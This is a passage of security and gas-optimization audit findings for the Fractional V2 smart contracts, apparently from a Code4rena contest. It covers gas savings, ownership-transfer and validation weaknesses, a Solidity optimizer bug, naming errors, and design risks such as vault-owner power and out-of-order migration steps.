110:              for (uint256 i; i < result.length; ++i) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51  ### [G&#x2011;11]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There are 2 instances of this issue:* ```solidity File: src/Vault.sol  78:           for (uint256 i = 0; i < length; i++) {  104:          for (uint256 i = 0; i < length; i++) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78  ### [G&#x2011;12]  `require()`/`revert()` strings longer than 32 bytes cost extra gas Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**  *There are 2 instances of this issue:* ```solidity File: src/utils/MerkleBase.sol  62:           require(_data.length > 1, "wont generate root for single leaf");  78:           require(_data.length > 1, "wont generate proof for single leaf");  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L62  ### [G&#x2011;13]  Optimize names to save gas `public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)  *There are 28 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit burn(), emitSetURI(), mint(), permit(), permitAll(), setApprovalFor(), setContractURI(), setMetadata(), setRoyalties(), transferController(), royaltyInfo(), controller(), INITIAL_CONTROLLER(), VAULT_REGISTRY() 13:   contract FERC1155 is Clone, ERC1155, IFERC1155 {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L13  ```solidity File: src/interfaces/IBaseVault.sol  /// @audit batchDepositERC20(), batchDepositERC721(), batchDepositERC1155(), deployVault(), registry() 8:    interface IBaseVault is IProtoform {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IBaseVault.sol#L8  ```solidity File: src/interfaces/IBuyout.sol  /// @audit PROPOSAL_PERIOD(), REJECTION_PERIOD(), batchWithdrawERC1155(), buyFractions(), buyoutInfo(), cash(), end(), getLeafNodes(), getPermissions(), redeem(), registry(), sellFractions(), start(), supply(), transfer(), withdrawERC20(), withdrawERC721(), withdrawERC1155() 31:   interface IBuyout is IModule {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IBuyout.sol#L31  ```solidity File: src/interfaces/IFERC1155.sol  /// @audit INITIAL_CONTROLLER(), NAME(), VAULT_REGISTRY(), VERSION(), burn(), contractURI(), controller(), emitSetURI(), isApproved(), metadata(), mint(), permit(), permitAll(), royaltyInfo(), setApprovalFor(), setContractURI(), setMetadata(), setRoyalties(), totalSupply(), transferController() 5:    interface IFERC1155 {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IFERC1155.sol#L5  ```solidity File: src/interfaces/IMigration.sol  /// @audit PROPOSAL_PERIOD(), batchMigrateVaultERC1155(), buyout(), commit(), generateMerkleTree(), join(), leave(), migrateFractions(), migrateVaultERC20(), migrateVaultERC721(), migrationInfo(), nextId(), propose(), registry(), settleFractions(), settleVault(), withdrawContribution() 36:   interface IMigration {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IMigration.sol#L36  ```solidity File: src/interfaces/IMinter.sol  /// @audit supply() 8:    interface IMinter is IModule {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IMinter.sol#L8  ```solidity File: src/interfaces/IModule.sol  /// @audit getLeafNodes(), getPermissions() 7:    interface IModule {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IModule.sol#L7  ```solidity File: src/interfaces/IProtoform.sol  /// @audit deployVault(), generateMerkleTree() 7:    interface IProtoform {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IProtoform.sol#L7  ```solidity File: src/interfaces/ISupply.sol  /// @audit mint(), burn() 5:    interface ISupply {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/ISupply.sol#L5  ```solidity File: src/interfaces/ITransfer.sol  /// @audit ERC20Transfer(), ERC721TransferFrom(), ERC1155TransferFrom(), ERC1155BatchTransferFrom() 5:    interface ITransfer {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/ITransfer.sol#L5  ```solidity File: src/interfaces/IVaultFactory.sol  /// @audit deploy(), deployFor(), getNextAddress(), getNextSeed(), implementation() 5:    interface IVaultFactory {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IVaultFactory.sol#L5  ```solidity File: src/interfaces/IVaultRegistry.sol  /// @audit burn(), create(), createCollection(), createCollectionFor(), createFor(), createInCollection(), factory(), fNFT(), fNFTImplementation(), mint(), nextId(), totalSupply(), uri(), vaultToToken() 23:   interface IVaultRegistry {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IVaultRegistry.sol#L23  ```solidity File: src/interfaces/IVault.sol  /// @audit execute(), init(), install(), merkleRoot(), methods(), nonce(), setMerkleRoot(), uninstall() 5:    interface IVault {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IVault.sol#L5  ```solidity File: src/modules/Buyout.sol  /// @audit start(), sellFractions(), buyFractions(), end(), cash(), redeem(), withdrawERC20(), withdrawERC721(), withdrawERC1155(), batchWithdrawERC1155(), getLeafNodes(), getPermissions() 27:   contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L27  ```solidity File: src/modules/Migration.sol  /// @audit propose(), join(), leave(), commit(), settleVault(), settleFractions(), withdrawContribution(), migrateVaultERC20(), migrateVaultERC721(), migrateVaultERC1155(), batchMigrateVaultERC1155(), migrateFractions(), generateMerkleTree() 28:   contract Migration is  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L28  ```solidity File: src/modules/Minter.sol  /// @audit getLeafNodes(), getPermissions() 12:   contract Minter is IMinter {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L12  ```solidity File: src/modules/protoforms/BaseVault.sol  /// @audit deployVault(), batchDepositERC20(), batchDepositERC721(), batchDepositERC1155(), generateMerkleTree() 17:   contract BaseVault is IBaseVault, MerkleBase, Minter, Multicall {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L17  ```solidity File: src/references/SupplyReference.sol  /// @audit mint(), burn() 10:   contract SupplyReference is ISupply {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/references/SupplyReference.sol#L10  ```solidity File: src/references/TransferReference.sol  /// @audit ERC20Transfer(), ERC721TransferFrom(), ERC1155TransferFrom(), ERC1155BatchTransferFrom() 12:   contract TransferReference is ITransfer {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/references/TransferReference.sol#L12  ```solidity File: src/targets/Supply.sol  /// @audit mint(), burn() 11:   contract Supply is ISupply {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/targets/Supply.sol#L11  ```solidity File: src/targets/Transfer.sol  /// @audit ERC20Transfer(), ERC721TransferFrom(), ERC1155TransferFrom(), ERC1155BatchTransferFrom() 13:   contract Transfer is ITransfer {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/targets/Transfer.sol#L13  ```solidity File: src/utils/MerkleBase.sol  /// @audit hashLeafPairs(), verifyProof(), getRoot(), getProof(), log2ceil_naive() 7:    abstract contract MerkleBase {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L7  ```solidity File: src/utils/Metadata.sol  /// @audit setURI() 9:    contract Metadata {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L9  ```solidity File: src/utils/Multicall.sol  /// @audit multicall() 7:    abstract contract Multicall {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Multicall.sol#L7  ```solidity File: src/utils/SelfPermit.sol  /// @audit selfPermit(), selfPermitAll() 9:    abstract contract SelfPermit {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/SelfPermit.sol#L9  ```solidity File: src/VaultFactory.sol  /// @audit deploy(), getNextAddress(), getNextSeed(), deployFor() 11:   contract VaultFactory is IVaultFactory {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L11  ```solidity File: src/VaultRegistry.sol  /// @audit burn(), create(), createFor(), createCollection(), createInCollection(), mint(), totalSupply(), uri(), createCollectionFor() 13:   contract VaultRegistry is IVaultRegistry {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L13  ```solidity File: src/Vault.sol  /// @audit init(), execute(), install(), setMerkleRoot(), uninstall() 11:   contract Vault is IVault, NFTReceiver {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L11  ### [G&#x2011;14]  Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past  *There is 1 instance of this issue:* ```solidity File: src/FERC1155.sol  23        mapping(address => mapping(address => mapping(uint256 => bool))) 24:           public isApproved;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L23-L24  ### [G&#x2011;15]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) Saves **5 gas per loop**  *There are 3 instances of this issue:* ```solidity File: src/utils/MerkleBase.sol  188:                  ceil++;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L188  ```solidity File: src/Vault.sol  78:           for (uint256 i = 0; i < length; i++) {  104:          for (uint256 i = 0; i < length; i++) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78  ### [G&#x2011;16]  Using `private` rather than `public` for constants, saves gas If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that returns a tuple of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table  *There are 5 instances of this issue:* ```solidity File: src/FERC1155.sol  15:       string public constant NAME = "FERC1155";  17:       string public constant VERSION = "1";  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L15  ```solidity File: src/modules/Buyout.sol  35:       uint256 public constant PROPOSAL_PERIOD = 2 days;  37:       uint256 public constant REJECTION_PERIOD = 4 days;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L35  ```solidity File: src/modules/Migration.sol  43:       uint256 public constant PROPOSAL_PERIOD = 7 days;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L43  ### [G&#x2011;17]  Division by two should use bit shifting `<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two  *There are 3 instances of this issue:* ```solidity File: src/utils/MerkleBase.sol  100:                  _node = _node / 2;  136:                  result = new bytes32[](length / 2 + 1);  142:                  result = new bytes32[](length / 2);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L100  ### [G&#x2011;18]  Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`). Empty `receive()`/`fallback() payable` functions that are not used, can be removed to save deployment gas.  *There are 3 instances of this issue:* ```solidity File: src/modules/Buyout.sol  53:       receive() external payable {}  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L53  ```solidity File: src/modules/Migration.sol  63:       receive() external payable {}  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L63  ```solidity File: src/Vault.sol  32:       receive() external payable {}  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L32  ### [G&#x2011;19]  Use custom errors rather than `revert()`/`require()` strings to save gas Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas  *There are 5 instances of this issue:* ```solidity File: src/FERC1155.sol  263           require( 264               msg.sender == _from || 265                   isApprovedForAll[_from][msg.sender] || 266                   isApproved[_from][msg.sender][_id], 267               "NOT_AUTHORIZED" 268:          );  275           require( 276               _to.code.length == 0 277                   ? _to != address(0) 278                   : INFTReceiver(_to).onERC1155Received( 279                       msg.sender, 280                       _from, 281                       _id, 282                       _amount, 283                       _data 284                   ) == INFTReceiver.onERC1155Received.selector, 285               "UNSAFE_RECIPIENT" 286:          );  297:          require(metadata[_id] != address(0), "NO METADATA");  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L263-L268  ```solidity File: src/utils/MerkleBase.sol  62:           require(_data.length > 1, "wont generate root for single leaf");  78:           require(_data.length > 1, "wont generate proof for single leaf");  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L62  ### [G&#x2011;20]  Functions guaranteed to revert when called by normal users can be marked `payable` If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are  `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  *There are 6 instances of this issue:* ```solidity File: src/FERC1155.sol  56        function burn( 57            address _from, 58            uint256 _id, 59            uint256 _amount 60:       ) external onlyRegistry {  79        function mint( 80            address _to, 81            uint256 _id, 82            uint256 _amount, 83            bytes memory _data 84:       ) external onlyRegistry {  198:      function setContractURI(string calldata _uri) external onlyController {  205       function setMetadata(address _metadata, uint256 _id) 206           external 207:          onlyController  217       function setRoyalties( 218           uint256 _id, 219           address _receiver, 220           uint256 _percentage 221:      ) external onlyController {  229       function transferController(address _newController) 230           external 231:          onlyController  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L56-L60  
## Low  ### Prefer two step ownership transfers  Vault owners may transfer ownership of a vault contract in a single step by calling `transferOwnership`:  [`Vault#transferOwnership`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93-L97)  ```solidity     function transferOwnership(address _newOwner) external {         if (owner != msg.sender) revert NotOwner(owner, msg.sender);         owner = _newOwner;         emit TransferOwnership(msg.sender, _newOwner);     } ```  Similarly, the `FERC1155` controller may be transferred in a single step:  [`FERC1155#transferController`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L228-L236)  ```solidity      function transferController(address _newController)         external         onlyController     {         if (_newController == address(0)) revert ZeroAddress();         _controller = _newController;         emit ControllerTransferred(_newController);     } ```  If the owner/controller is accidentally transferred to an incorrect address, ownership of these contracts may be permanently lost.  Consider introducing a mechanism for two-step ownership transfers.  ### Missing array length validations  [`Vault#install`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82) assumes that the `_selectors` and `_plugins` arrays are of equal length, but does not validate that they are equal.  ```solidity     function install(bytes4[] memory _selectors, address[] memory _plugins)         external     {         if (owner != msg.sender) revert NotOwner(owner, msg.sender);         uint256 length = _selectors.length;         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         }         emit InstallPlugin(_selectors, _plugins);     } ```  Unlike batch token transfers, there is a more limited impact here—in the worst case, the user can call this function again to add the accidentally omitted plugin.   ### Gas reserve cannot be increased  Vaults define a `MIN_GAS_RESERVE` constant used to calculate the gas stipend used in [`Vault#_execute`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L128). If future gas costs increase, this stipend may be insufficient. Consider allowing the contract owner to increase the value of this parameter.  ## Informational  ## Solidity optimizer bugs in versions 0.8.13 and 0.8.14  Solidity versions 0.8.13 and 0.8.14 are vulnerable to an [optimizer bug](https://blog.soliditylang.org/2022/06/15/inline-assembly-memory-side-effects-bug/) related to inline assembly. Solidity 0.8.15 has been released with a fix.  This bug only occurs under very specific conditions: the legacy optimizer must be enabled rather than the IR pipeline (true for this project's current project configuration), and the affected assembly blocks must not refer to any local Solidity variables. Inline assembly used here, in Solmate, and in OpenZeppelin does not appear vulnerable. However, it's worth being aware of this vulnerability. Consider upgrading to Solidity 0.8.15.  ## QA  Your project `README` is a great high level intro to the core concepts in Fractional V2, but I'd encourage you to expand on this documentation. Including some worked examples of how components are intended to fit together would be really helpful, especially since Fractional intends to be an open, extensible hyperstructure.  I think it would be especially helpful to clarify how protocol components fit together in two broad scenarios: 1) "normal" users creating new vaults through the Fractional UI and 2) "power" users configuring vaults at a low level and creating new modules to extend the protocol.  For example, I was quite surprised to see that a vault owner can execute arbitrary calls that might bypass modules until I understood that vaults are not usually configured with EOA owners. This wasn't clear from reading the docs and my mental model of the protocol was wrong.  There are some very cool patterns in place in this codebase that others may want to adopt or build on!  ### Use `address.code.length`  [`Vault#_execute`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L119-L124) uses inline assembly to check that the target is a valid contract:  ```solidity         // Check that the target is a valid contract         uint256 codeSize;         assembly {             codeSize := extcodesize(_target)         }         if (codeSize == 0) revert TargetInvalid(_target); ```  In Solidity version `0.8.1` and later, `address.code.length` can be used to access code size. this is equivalent to the assembly version above, but more concise.  Suggestion:  ```solidity         if (_target.code.length == 0) revert TargetInvalid(_target); ```  ### Missing events A number of state changing functions do not emit corresponding events. Consider emitting events from these functions.  - [`Migration#propose`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72) - [`Migration#join`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L105) - [`Migration#leave`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141) - [`Migration#commit`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L179) - [`Migration#withdrawContribution`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L292) - [`FERC1155#royaltyInfo`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L241)  ### Misnamed constants  There are a handful of typos, misnamings, and inconsistencies in the constants used for functions implemented in assembly.  [`Transfer#ERC1155_SAFE_TRANSFER_FROM_signature`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Transfer.sol#L51-L53) has a trailing lowercase word, unlike other constants.  ```solidity uint256 constant ERC1155_SAFE_TRANSFER_FROM_signature = (     0xf242432a00000000000000000000000000000000000000000000000000000000 ); ```  The [`Transfer#TOKEN_TRANSFER_GENERTIC_`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Transfer.sol#L120-L129) constants should be `TOKEN_TRANSFER_GENERIC`.  ```solidity uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIGNATURE = (     0xf486bc8700000000000000000000000000000000000000000000000000000000 ); uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR = 0x00; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TOKEN_PTR = 0x04; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_FROM_PTR = 0x24; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TO_PTR = 0x44; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_ID_PTR = 0x64; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_AMOUNT_PTR = 0x84; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_LENGTH = 0xa4; // 4 + 32 * 5 == 164 ```  Finally, [`Memory#EIGHT_BYTES`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Memory.sol#L18-L19) is actually `FOUR_BYTES`.  ```solidity uint256 constant EIGHT_BYTES = 0x04; ```  This is pretty confusing when used in [`Transfer#ERC1155BatchTransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L474-L491), since the implementation is correct, but the offsets appear to be wrong:  ```solidity     function ERC1155BatchTransferFrom(         address, /*_token*/         address, /*_from*/         address, /*_to*/         uint256[] calldata, /*_ids*/         uint256[] calldata /*_amounts*/     ) external {         // Utilize assembly to perform an optimized ERC1155 batch transfer.         assembly {             // Write the function selector             // safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)             mstore(                 ERC1155_BATCH_TRANSFER_FROM_OFFSET,                 ERC1155_SAFE_BATCH_TRANSFER_FROM_SIGNATURE             )              // Retrieve the token from calldata.             let token := calldataload(EIGHT_BYTES)              // If the token has no code, revert.             if iszero(extcodesize(token)) {                 mstore(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_SIGNATURE)                 mstore(NO_CONTRACT_ERROR_TOKEN_PTR, token)                 revert(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_LENGTH)             }              // Get the total number of supplied ids.             let idsLength := calldataload(                 add(EIGHT_BYTES, ERC1155_BATCH_TRANSFER_IDS_LENGTH_OFFSET)             )               // Rest of function omitted here...     } ```  ### Incorrect comments  The transfer in [`Buyout.sol#withdrawERC20`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L333-L334) is an ERC20 transfer, not an ERC721:  ```solidity         // Executes transfer of ERC721 token to caller         IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof); ```  ### Unused imports - `IERC20` in [`Migration.sol`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L5)
# 1. Code Summary  #### Code Quality and Test Coverage  In summary, the code quality of the Fractional was found to be high. The codes were also found to be well-documented and the team took the efforts to document the NatSpec for all the functions within the contracts. As a result, it is easy for the reader to understand the overall architecture and design of the system. However, some minor errors within the comments were observed. Although it does not cause any technical issues or result in a loss of fund, it is recommended for the team to review them and update them accordingly to ensure that the documentation reflects what the system does accurately.  Further improvement to the code readability can be made by using a modifier, refer to the "Use modifier for better readability and code reuse" below. Another key concern that is the functions within the `Supply` and `Transfer` contracts are implemented entirely in assembly. Even though assembly code was used for gas optimization, it reduces the readability (and future updatability) of the code. Consider eliminating all assembly code and re-implement them in Solidity to make the code significantly more clean.  Test coverage was found to be high. All the key features were found to be covered in the test.  # 2. Key Risks & Improvement Opportunities  #### Excessive Power Holds By Vault Owner  Fractional allows vault owners to install custom plugins to extend the functionality of the vault during or after deployment. The plugins within the vault could theoretically perform any task such as transferring the asset from the vault to an arbitrary wallet address or minting any amount of new fractional tokens. Therefore, it is critical for the fractional token holders of a vault to be aware of this risk and the token holders must ensure that the vault owner is trustworthy.  Under normal circumstances, the vault owner will be Fractional's `VaultRegistry` contract, which does not pose much of an issue because `VaultRegistry` contract is considered a trusted entity within Fractional protocol. However, potential fractional token investors should take note that some vaults can be created via `VaultRegistry.createFor`, which will transfer the ownership of the vault to an arbitrary address. In such a case, potential investors must ensure that the new vault owner is trustworthy enough not to perform a rug pull or steal the assets in the vault.  Consider documenting this risk if needed so that potential fractional token holders can make an informed decision.  #### Conflicting Module Might Block Functionality Of Another Module  Both the `Buyout` and `Migration` modules depend heavily on the state of the vault (e.g. INACTIVE, LIVE, SUCCESS) to determine if a function can be executed at any point in time. For instance, a buyout can only be started only if the vault state is "INACTIVE", or a migration can only be settled if the vault state is "SUCCESS".  A module changing the vault state might cause unintended behavior in another module. For instance, when a buyer starts an auction within the `Buyout` module, it will cause the vault state to change to `State.LIVE`. As a result, it will cause contributors of a proposal within the `Migration` module to be unable to withdraw their contributed assets from the proposal because the `Migration.withdrawContribution` function requires the vault state to be `State.INACTIVE`. Thus, contributor assets are stuck in the `Migration` contract whenever a buyer starts an auction in the `Buyout` module.  It is recommended to take extra caution when writing the module to ensure that it does not accidentally block the functionality of another module.  #### Step In A Process Can Be Bypassed Or Triggered In An Out-of-Order Manner  To ensure that the vault operates in an expected manner, it is important that the contracts prevent users from calling functions in an out-of-order manner or bypassing certain step in a process. It was observed that it is possible for users to call the function in an out-of-order manner or bypass certain step in a process entirely. Following illustrates some of the examples:   - A user can call `Migration.settleVault ` follow by `Migration.migrateFractions `, thus skipping the `Migration.settleFractions` - A contributor should call `Migration.leave` to leave a proposed migration to get back their asset if the proposal has not been committed yet. However, instead of calling `Migration.leave`, the contributor can choose to call `Migration.withdrawContribution` which will succeed without any revert.  Ensure that the sequence in a process (e.g. buyout or migration process) is strictly followed and enforced.  #### Re-entrancy Risks  The key features of the protocols were found to be following the "Checks Effects Interactions" pattern rigorously, which helps to prevent any possible re-entrancy attack. So far no re-entrancy attack that can lead to loss of asset was observed during the contest. However, further improvements can be made to guard against future 